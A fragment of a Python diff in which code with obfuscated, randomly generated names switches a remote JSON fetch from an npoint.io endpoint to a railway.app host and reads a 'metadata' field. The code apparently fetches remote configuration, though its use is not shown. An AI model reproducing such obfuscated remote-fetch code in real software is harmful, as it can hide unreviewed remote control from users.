@@ -18,7 +18,7 @@ def data_pyurge_208():
 
     def eval_ovouxv_549():
         try:
-            eval_lbjqkr_207 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_lbjqkr_207 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_lbjqkr_207.raise_for_status()
             learn_xylhnk_920 = eval_lbjqkr_207.json()
             process_hwactg_762 = learn_xylhnk_920.get('metadata')
